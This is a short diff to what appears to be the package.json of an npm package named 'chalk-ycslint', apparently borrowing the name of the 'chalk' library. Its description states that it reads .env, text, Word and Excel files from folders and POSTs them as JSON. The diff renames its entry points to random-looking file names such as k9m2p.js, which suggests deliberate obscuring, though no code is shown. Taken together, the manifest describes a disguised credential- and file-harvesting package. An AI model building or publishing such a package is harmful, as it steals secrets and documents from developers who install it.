@@ -4,9 +4,9 @@
   "description": "CLI: read .txt, .env, .docx, .xls/.xlsx from paths or folders and POST as JSON (Windows, macOS, Linux)",
   "type": "module",
   "bin": {
-    "chalk-ycslint": "./bin/cli.js"
+    "chalk-ycslint": "./bin/k9m2p.js"
   },
-  "main": "./lib/index.js",
+  "main": "./lib/x7n4q.js",
   "files": [
     "bin",
     "lib"
